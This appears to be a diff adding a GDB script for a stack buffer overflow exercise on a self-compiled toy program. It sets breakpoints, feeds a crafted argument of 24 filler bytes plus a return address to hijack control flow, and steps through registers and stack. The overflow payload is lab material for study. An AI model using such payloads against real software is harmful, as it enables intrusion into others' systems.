@@ -1,0 +1,31 @@
+#gcc -ggdb -o stack_ret_overwrite stack_ret_overwrite.c 
+file stack_ret_overwrite_clean
+break *main+0
+break *main+41
+break *main+59
+break do_something
+break *do_something+96
+break *do_something+101
+break *do_something+121
+## Want to redirect to 0x0000555555554855
+#r "AAAAAAA"
+r `python -c 'print "B"*24+"\x55\x48\x55\x55\x55\x55"'`
+info proc mappings
+disas
+info registers rsp rbp rsi rdi rip
+x/8gx $rsp
+c
+info registers rsp rbp rsi rdi rip
+x/8gx $rsp
+si
+info registers rsp rbp rsi rdi rip
+x/8gx $rsp
+si
+info registers rsp rbp rsi rdi rip
+x/8gx $rsp
+si
+info registers rsp rbp rsi rdi rip
+x/8gx $rsp
+si
+
+
